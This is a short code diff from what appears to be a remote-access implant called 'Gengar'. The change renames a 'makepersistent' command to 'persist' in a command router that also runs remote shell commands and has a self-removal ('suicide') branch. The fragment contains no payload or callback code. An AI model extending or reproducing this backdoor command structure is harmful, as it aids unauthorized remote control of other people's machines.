@@ -48,9 +48,9 @@ void Gengar::RouteCommand(std::string& type, std::string& content)
 		output = m_machine.RunShellCommand(std::move(content));
 	else if (type == "action")
 	{
-		if (IsEqual(content, "makepersistent"))
+		if (IsEqual(content, "persist"))
 		{
-			m_machine.MakePersistent();
+			m_machine.Persist();
 			output = "Gengar is now persistent.";
 		}
 		else if (IsEqual(content, "suicide"))
